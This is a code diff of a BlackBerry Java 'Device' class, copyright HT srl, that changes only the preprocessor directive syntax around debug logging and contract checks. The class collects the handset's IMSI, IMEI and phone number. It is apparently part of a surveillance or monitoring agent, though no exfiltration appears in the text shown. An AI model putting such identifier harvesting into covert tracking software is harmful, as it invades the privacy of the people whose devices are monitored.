@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -26,8 +27,9 @@ import blackberry.utils.WChar;
 public final class Device implements Singleton {
 
     /** The debug instance. */
-    // #debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);
+    //#endif
 
     public static final int VERSION = 2010033101;
     public static final String SUBTYPE = "BLACKBERRY";
@@ -74,9 +76,9 @@ public final class Device implements Singleton {
      */
     public static byte[] getVersion() {
         final byte[] versionRet = Utils.intToByteArray(VERSION);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.ensures(versionRet.length == 4, "Wrong version len");
-        // #endif
+        //#endif
         return versionRet;
     }
 
@@ -104,9 +106,9 @@ public final class Device implements Singleton {
      */
     public String getImei() {
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.ensures(imei != null, "null imei");
-        // #endif
+        //#endif
         return Utils.imeiToString(imei);
     }
 
@@ -125,9 +127,9 @@ public final class Device implements Singleton {
      * @return the phone number
      */
     public String getPhoneNumber() {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.ensures(phoneNumber != null, "null phoneNumber");
-        // #endif
+        //#endif
         return phoneNumber;
     }
 
@@ -138,9 +140,9 @@ public final class Device implements Singleton {
      */
     public byte[] getWImei() {
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.ensures(imei != null, "null imei");
-        // #endif
+        //#endif
         return WChar.getBytes(Utils.imeiToString(imei));
     }
 
@@ -159,9 +161,9 @@ public final class Device implements Singleton {
      * @return the phone number
      */
     public byte[] getWPhoneNumber() {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.ensures(phoneNumber != null, "null phoneNumber");
-        // #endif
+        //#endif
         final byte[] encoded = WChar.getBytes(phoneNumber);
         return encoded;
     }
@@ -173,23 +175,27 @@ public final class Device implements Singleton {
 
         try {
             imsi = SIMCardInfo.getIMSI();
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("IMSI: " + Utils.imeiToString(imsi));
+            //#endif
         } catch (final SIMCardException e) {
-            // #debug
+            //#ifdef DEBUG
             debug.warn("no sim detected");
+            //#endif
         }
 
         imei = GPRSInfo.getIMEI();
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("IMSE: " + Utils.imeiToString(imsi));
+        //#endif
 
         phoneNumber = Phone.getDevicePhoneNumber(true);
         if (phoneNumber == null) {
             phoneNumber = "UNKNOWN";
         }
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("Phone Number: " + phoneNumber);
+        //#endif
     }
 
 }
